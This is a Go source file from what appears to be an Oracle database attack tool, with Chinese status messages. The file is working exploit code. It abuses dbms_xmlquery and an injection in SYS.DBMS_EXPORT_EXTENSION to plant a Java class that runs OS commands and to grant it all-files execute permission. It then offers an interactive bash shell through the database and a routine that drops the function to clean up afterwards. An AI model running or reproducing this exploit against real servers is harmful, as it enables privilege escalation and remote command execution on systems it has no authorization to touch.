package pac

import (
	"bufio"
	"database/sql"
	"fmt"
	"os"
	"strings"
)

func OracleXMLQuery(conn *sql.DB) {

	_, err := OracleCMD(fmt.Sprintf("select dbms_xmlquery.newcontext('declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate ''create or replace and compile java source named \"LinxUtil\" as import java.io.*; public class LinxUtil extends Object {public static String runCMD(String args) {try{BufferedReader myReader= new BufferedReader(new InputStreamReader( Runtime.getRuntime().exec(args).getInputStream() ) ); String stemp,str=\"\";while ((stemp = myReader.readLine()) != null) str +=stemp+\"\\n\";myReader.close();return str;} catch (Exception e){return e.toString();}}}'';commit;end;') from dual"), conn)
	if err != nil {
		Err(err)
	}

	_, err = OracleCMD(fmt.Sprintf("select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT\".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''begin dbms_java.grant_permission(''''''''YY'''''''', ''''''''SYS:java.io.FilePermission'''''''',''''''''<<ALL FILES>>'''''''', ''''''''execute'''''''');end;'''';END;'';END;--','SYS',0,'1',0) from dual"), conn)
	if err != nil {
		Err(err)
	}

	_, err = OracleCMD(fmt.Sprintf("select dbms_xmlquery.newcontext('declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate ''create or replace function LinxRunCMD(p_cmd in varchar2) return varchar2 as language java name ''''LinxUtil.runCMD(java.lang.String) return String''''; '';commit;end;') from dual"), conn)
	if err != nil {
		Err(err)
	}

	_, err = OracleCMD(fmt.Sprintf("select OBJECT_ID from all_objects where object_name ='LINXRUNCMD'"), conn)
	if err != nil {
		Err(err)
	}
}

func OracleXMLQueryConsole(conn *sql.DB) {
	Info("执行系统命令")
	OracleXMLQuery(conn)
	reader := bufio.NewReader(os.Stdin)
	for {
		var cmd string
		fmt.Printf("%s:%s> $ ", Rhost, Rport)
		cmd, _ = reader.ReadString('\n')
		cmd = strings.TrimRight(cmd, "\r\n")
		if cmd == "exit" || cmd == "q" || cmd == "quit" {
			break
		}
		resultSet, err := OracleCMD(fmt.Sprintf("select LinxRunCMD('/bin/bash -c /usr/bin/%s') from dual", cmd), conn)
		for _, m := range resultSet {
			for _, value := range m {
				fmt.Println(fmt.Sprintf("%s", value))
			}
		}
		if err != nil {
			Err(err)
		}
	}
}

func OracleXMLQueryCMD(cmd string, conn *sql.DB) {
	Info("执行系统命令")
	OracleXMLQuery(conn)
	resultSet, err := OracleCMD(fmt.Sprintf("select LinxRunCMD('/bin/bash -c /usr/bin/%s') from dual", cmd), conn)
	for _, m := range resultSet {
		for _, value := range m {
			fmt.Println(fmt.Sprintf("%s", value))
		}
	}
	if err != nil {
		Err(err)
	}
}

func DropFucnction(conn *sql.DB) {
	Info("卸载命令执行函数")
	_, err := OracleCMD(fmt.Sprintf("drop function LinxRunCMD"), conn)
	if err != nil {
		Err(err)
	}
	Success("卸载成功")
}
